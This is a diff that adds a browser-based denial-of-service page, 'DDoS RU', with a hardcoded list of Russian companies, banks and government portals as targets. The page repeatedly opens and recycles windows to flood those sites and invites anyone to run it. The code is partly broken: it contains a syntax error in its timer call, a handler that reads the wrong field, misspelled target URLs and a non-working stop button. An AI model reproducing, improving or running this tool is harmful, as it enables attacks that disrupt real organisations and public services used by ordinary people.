@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+	<title>DDoS RU</title>
+
+	<style>
+	  body {background-color: powderblue;}
+	  h1,p {color: blue;}
+
+		#container {
+			width: 300px;
+			margin: auto;
+			margin-top: 50px;
+		}
+	</style>
+</head>
+
+<body>
+	<center><h1>DDoS against select Russian targets</h1></center>
+	<div id="container">
+		<p><input id="windowcount" type="number" min="1" max="25" onblur="getWindowCount()" value="5" title="1 to 25"> Open how many windows?</p>
+		<p><input id="windowlive" type="number" min="1" max="25" onblur="getWindowLive()" value="10" title="1 to 30"> Recycle window after how many seconds?</p>
+		<button onclick="openURLs(); return false;">Start</button><br>
+		<button onclick="killAll(); return false;">Stop all</button> **Not functioning yet**<br>
+		<p>
+			THis is a quick and easy script that anyone can run in a browser. The targets are preselected (you can view them)
+		</p>
+	</div>
+</body>
+
+<script type="text/javascript">
+
+data ='{"url":["https://www.gazprom.ru","https://lukoil.ru","https://magnit.ru","https://www.nornickel.com","https://www.surgutneftegas.ru","https://www.tafneft.ru","https://www.evraz.com/ru","https://nlmk.com","https://www.sibur.ru","https://wwwseverstal.com","https://www.metalloinvest.com","https://nangs.org","https://rmk-group.ru/ru/","https://www.tmk-group.ru","https://ya.ru","https://www.polymetalinternational.com/ru/","https://www.uralkali.com/ru/","https://www.eurosib.ru","https://omk.ru/","https://www.sberbank.ru","https://www.vtb.ru","https://www.gszPrombank.ru","https://www.gosuslugi.ru","https://mos.ru/uslugi","https://kremlin.ru","https://government.ru","https://mil.ru","https://www.nalog.gov.ru","https://customs.gov.ru","https://pfr.gov.ru","https://rkn.gov.ru"]}'
+
+const dataobj = JSON.parse(data);
+var numWindows = 5;
+var dataIndex = 0;
+var windowlivesec = 10000;
+var dataLength = dataobj.url.length;
+console.log('dl',dataLength);
+
+console.log(dataobj);
+
+function getWindowCount() {
+	numWindows = $( "#windowcount" ).val();
+}
+
+function getWindowLive(){
+	 windowlivesec = $( "#windowcount" ).val() * 1000;
+}
+
+function closeOnLoad(myLink)
+{
+  var newWindow = window.open(myLink);
+  setTimeout(
+             function()
+             {
+               newWindow.close();
+							 openAnother();
+             },
+             windowlivesec;
+            );
+  };
+
+function openAnother(){
+	dataIndex++;
+	console.log(dataLength);
+	if (dataIndex == dataLength) {
+		dataIndex = 0;
+	}
+	closeOnLoad(dataobj.url[dataIndex]);
+	console.log(dataIndex,dataobj.url[dataIndex]);
+}
+
+function openURLs(){
+	for (let i = 0; i < numWindows; i++) {
+	  closeOnLoad(dataobj.url[i]);
+		dataIndex = i;
+	}
+}
+
+function killAll(){
+	throw new Error("Killed!");
+}
+
+</script>
+
+</html>
